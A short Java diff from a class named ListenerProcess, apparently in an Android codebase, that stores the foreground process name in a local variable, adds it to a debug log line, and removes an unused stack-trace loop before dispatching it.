@@ -174,15 +174,12 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 
 		@Override
 		public  void run() {
+
+			String foreground = Status.self().getForeground();
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (run)");
+				Check.log(TAG + " (run) " + foreground);
 			}
-			StackTraceElement[] stacktrace = (new Exception()).getStackTrace();
-			for (int i = 0; i < stacktrace.length; i++) {
-				StackTraceElement el  = stacktrace[i];
-				el.getClassName();
-			}
-			dispatch(Status.self().getForeground());
+			dispatch(foreground);
 		}
 
 	};
